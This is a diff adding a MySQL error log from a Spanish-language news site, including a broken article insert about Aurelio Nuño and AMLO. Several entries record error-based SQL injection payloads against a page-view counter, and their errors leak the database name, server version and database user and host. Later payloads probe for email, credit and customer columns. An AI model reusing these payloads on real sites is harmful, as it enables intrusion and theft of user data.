@@ -1,0 +1,85 @@
+Time : 14:27:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'oferta' a la CNTE','nuñio.jpg','','','
+CIUDAD DE MÉXICO
+
+El secretario de E' at line 1
+Raw SQL : CALL insertar('nacional','','nacionalprincipal','Aurelio Nuño arremete contra AMLO por 'oferta' a la CNTE','nuñio.jpg','','','
+CIUDAD DE MÉXICO
+
+El secretario de Educación Pública, Aurelio Nuño Mayer, acusó al líder de Morena, Andrés Manuel López Obrador, de anteponer intereses políticos a la educación de los niños, en relación al acercamiento que ha tenido con la Sección 22, en Oaxaca.
+<p>
+Reprobó la oferta de Morena a la Coordinadora Nacional de Trabajadores de la Educación (CNTE) de que si ganan la gubernatura en Oaxaca se recuperará el Instituto Estatal de Educación Pública (IEEPO), reiteró que ese partido político y su dirigente “prefieren y anteponen el poder y hacer un pacto con facciones que representan al viejo sistema”.
+<p>
+Es decir, “que están en la lógica de la venta y la herencia de plazas, de dejar a los niños sin clases, de no cumplir con la ley y de no evaluarse”.
+<p>
+Sostuvo que ese partido y su líder buscan ese tipo de pactos políticos, “poniéndolos por encima del derecho que tienen los niños y las niñas a la educación, por encima de una transformación de fondo de la educación, de la propia dignificación de los maestros de México”.
+<p>
+Ese, apuntó, “es el modelo por el que ellos optan, claramente nosotros no lo compartimos. No estamos de acuerdo. La reforma educativa no tiene marcha atrás y va a continuar en todo el país”.
+<p>
+Nuño Mayer desmintió, por otra parte, que las autoridades educativas hayan otorgado algún Reconocimiento de Validez Oficial de Estudios (RVOE) a las universidades que promueve Morena, como anunció esa organización política.','','','','','','','','')
+
+Time : 13:14:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahuahoy!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),DaTaBaSe(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 13:14:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 13:14:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chhoy@ps447048.dreamhost.com!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),UsEr(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 07:52:01
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 03:40:24
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt CoNcAt(char(33,126,33),count(t.TaBlE_NaMe),char(33,126,33)) FrOm information_schema.ScHeMaTa as d join information_schema.TaBlEs as t on t.TaBlE_ScHeMa = d.ScHeMa_nAmE join information_schema.CoLuMnS as c on c.TaBlE_ScHeMa = d.ScHeMa_nAmE and c.TaBlE_NaMe = t.TaBlE_NaMe WhErE not c.TaBlE_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d.ScHeMa_nAmE = DaTaBaSe() and c.CoLuMn_nAmE like 0x256f7264657225)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 03:40:21
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt CoNcAt(char(33,126,33),count(t.TaBlE_NaMe),char(33,126,33)) FrOm information_schema.ScHeMaTa as d join information_schema.TaBlEs as t on t.TaBlE_ScHeMa = d.ScHeMa_nAmE join information_schema.CoLuMnS as c on c.TaBlE_ScHeMa = d.ScHeMa_nAmE and c.TaBlE_NaMe = t.TaBlE_NaMe WhErE not c.TaBlE_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d.ScHeMa_nAmE = DaTaBaSe() and c.CoLuMn_nAmE like 0x25637573746f6d657225)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 03:40:17
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt CoNcAt(char(33,126,33),count(t.TaBlE_NaMe),char(33,126,33)) FrOm information_schema.ScHeMaTa as d join information_schema.TaBlEs as t on t.TaBlE_ScHeMa = d.ScHeMa_nAmE join information_schema.CoLuMnS as c on c.TaBlE_ScHeMa = d.ScHeMa_nAmE and c.TaBlE_NaMe = t.TaBlE_NaMe WhErE not c.TaBlE_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d.ScHeMa_nAmE = DaTaBaSe() and c.CoLuMn_nAmE like 0x2563726564697425)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 03:40:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt(SeLeCt CoNcAt(char(33,126,33),count(t.TaBlE_NaMe),char(33,126,33)) FrOm information_schema.ScHeMaTa as d join information_schema.TaBlEs as t on t.TaBlE_ScHeMa = d.ScHeMa_nAmE join information_schema.CoLuMnS as c on c.TaBlE_ScHeMa = d.ScHeMa_nAmE and c.TaBlE_NaMe = t.TaBlE_NaMe WhErE not c.TaBlE_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d.ScHeMa_nAmE = DaTaBaSe() and c.CoLuMn_nAmE like 0x25656d61696c25)) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 03:40:11
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 03:40:08
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SeLeCt 1 FrOm(SeLeCt count(*),CoNcAt((SeLeCt(SeLeCt CoNcAt(char(33,126,33),VeRsIoN(),char(33,126,33))) FrOm information_schema.TaBlEs LiMiT 0,1),floor(rand(0)*2))x FrOm information_schema.TaBlEs GrOuP By x)a)
+
+Time : 01:18:26
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:17:55
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:17:24
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:16:53
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:16:22
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:15:51
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:03:04
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:02:17
+SQLSTATE[HY000] [2002] Connection timed out
+
+Time : 01:00:12
+SQLSTATE[HY000] [2002] Connection timed out
